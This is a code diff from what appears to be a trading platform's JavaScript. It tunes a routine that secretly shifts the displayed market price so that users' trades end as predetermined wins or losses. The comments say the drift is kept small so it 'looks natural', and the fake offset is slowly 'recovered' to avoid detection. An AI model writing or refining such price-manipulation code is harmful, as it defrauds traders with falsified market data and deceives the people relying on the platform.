@@ -941,42 +941,35 @@
       const elapsed = now - manipulation.startTime;
       const progress = Math.min(elapsed / manipulation.duration, 1);
       
-      // === SEAMLESS MANIPULATION ===
-      // Offset grows from start but VERY slowly at first (power 5)
-      // At 50% progress: only ~3% of max offset applied
-      // Most of the offset happens in last 20% of trade
+      // === GRADUAL LINEAR MANIPULATION ===
+      // Small offset that grows LINEARLY over many candles
+      // Each candle adds tiny identical increment
       
-      // Working offset: 0.2-0.4%
-      const maxChangePercent = 0.002 + (manipulation.duration / 300000) * 0.002;
+      // Very small total: 0.05% = ~$33 for BTC at $67k
+      // Enough to tip WIN/LOSS but looks natural
+      const maxChangePercent = 0.0005;
       const maxChange = manipulation.entryPrice * maxChangePercent;
       
       // Direction: favorable for WIN, against for LOSS
       const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
       const actualDirection = manipulation.shouldWin ? favorableDirection : -favorableDirection;
       
-      // Ultra smooth curve - power 5: almost invisible at start
-      // progress 0.2 -> 0.00032 (0.03%)
-      // progress 0.5 -> 0.03125 (3%)
-      // progress 0.8 -> 0.32768 (33%)
-      // progress 1.0 -> 1.0 (100%)
-      const smoothCurve = Math.pow(progress, 5);
-      
-      const offset = maxChange * smoothCurve * actualDirection;
+      // LINEAR growth - same tiny increment every update
+      // No curve, no jumps - just slow steady drift
+      const offset = maxChange * progress * actualDirection;
       
       // Apply offset to real price
       const manipulatedPrice = realPrice + offset;
       
       manipulation.lastManipulatedPrice = manipulatedPrice;
+      manipulation.savedOffset = offset; // Save for recovery
       return manipulatedPrice;
     }
     
     if (manipulation.recovering) {
       const elapsed = now - manipulation.recoverStart;
-      const recoveryDuration = 45000; // 45 seconds recovery
+      const recoveryDuration = 60000; // 60 seconds slow recovery
       const progress = Math.min(elapsed / recoveryDuration, 1);
-      
-      // Very gradual recovery - barely noticeable
-      const curve = Math.pow(progress, 2); // slow start, accelerates
       
       if (progress >= 1) {
         manipulation.recovering = false;
@@ -984,8 +977,8 @@
         return realPrice;
       }
       
-      // Use saved offset from end of manipulation
-      const currentOffset = manipulation.savedOffset * (1 - curve);
+      // Linear recovery - same tiny decrement each update
+      const currentOffset = manipulation.savedOffset * (1 - progress);
       
       return realPrice + currentOffset;
     }
@@ -1017,13 +1010,7 @@
   function stopManipulation() {
     if (!manipulation.active) return;
     
-    // Save the current offset for recovery
-    if (manipulation.lastManipulatedPrice && lastRealPrice) {
-      manipulation.savedOffset = manipulation.lastManipulatedPrice - lastRealPrice;
-    } else {
-      manipulation.savedOffset = 0;
-    }
-    
+    // savedOffset already saved in manipulatePrice()
     manipulation.active = false;
     manipulation.recovering = true;
     manipulation.recoverStart = Date.now();
